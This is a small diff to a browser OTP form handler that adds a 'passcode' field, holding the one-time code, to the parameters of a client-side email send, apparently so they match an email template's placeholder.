@@ -132,7 +132,8 @@ document.getElementById('otp-form').onsubmit = async (e) => {
                 otp: data.otp,
                 OTP: data.otp,
                 code: data.otp,
-                message: data.otp, // Sometimes people use {{message}}
+                passcode: data.otp, // MATCHING YOUR IMAGE! 🎯
+                message: data.otp,
             });
             console.log("🚀 Email sent successfully via Browser!");
         } catch (emailErr) {
